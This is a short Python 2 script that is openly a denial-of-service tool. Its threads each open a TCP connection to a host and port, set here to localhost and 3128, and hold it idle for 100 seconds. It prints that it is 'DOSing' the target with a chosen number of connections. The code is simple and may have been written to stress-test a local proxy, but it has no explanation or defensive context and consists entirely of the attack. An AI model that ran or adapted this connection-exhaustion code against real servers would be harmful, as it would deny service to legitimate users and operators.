#!/usr/bin/env python

import socket
import threading
import time
import sys

HOST = 'localhost'    # The remote host
PORT = 3128              # The same port as used by the server
NUM = 5

if (len(sys.argv) > 1):
        NUM = int(sys.argv[1])

class DOS(threading.Thread):

        def run(self):
                global HOST
                global PORT
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))
                time.sleep(100)

if __name__ == "__main__":
        print "DOSing " + HOST + " on port " + str(PORT) + " with " + str(NUM) + " Connections"
        for x in range(NUM):
                t = DOS()
                t.start()

